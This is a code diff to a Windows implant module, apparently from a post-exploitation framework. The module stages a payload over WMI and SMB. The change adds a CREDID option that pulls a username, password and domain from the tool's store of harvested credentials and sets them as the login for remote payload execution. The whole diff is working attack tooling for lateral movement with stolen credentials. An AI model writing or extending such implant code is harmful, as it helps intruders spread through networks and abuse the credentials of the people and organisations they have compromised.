@@ -22,6 +22,7 @@ class SWbemServicesImplant(core.implant.Implant):
         self.options.register("SMBUSER", "", "username for login")
         self.options.register("SMBPASS", "", "password for login")
         self.options.register("SMBDOMAIN", ".", "domain for login")
+        self.options.register("CREDID", "", "cred id from creds")
         self.options.register("PAYLOAD", "", "payload to stage")
 
     def run(self):
@@ -33,6 +34,23 @@ class SWbemServicesImplant(core.implant.Implant):
             return
 
         self.options.set("CMD", payload)
+
+        cred_id = self.options.get("CREDID")
+
+        if cred_id:
+            key = self.shell.creds_keys[int(cred_id)]
+            smbuser = self.shell.creds[key]["Username"]
+            smbpass = self.shell.creds[key]["Password"]
+            smbdomain = self.shell.creds[key]["Domain"]
+            self.options.set("SMBUSER", smbuser)
+            if not smbuser:
+                self.shell.print_warning("Cred has no Username!")
+            self.options.set("SMBPASS", smbpass)
+            if not smbpass:
+                self.shell.print_warning("Cred has no Password!")
+            self.options.set("SMBDOMAIN", smbdomain)
+            if not smbdomain:
+                self.shell.print_warning("Cred has no Domain!")
 
         payloads = {}
         payloads["js"] = self.loader.load_script("data/implant/pivot/exec_wmi.js", self.options)
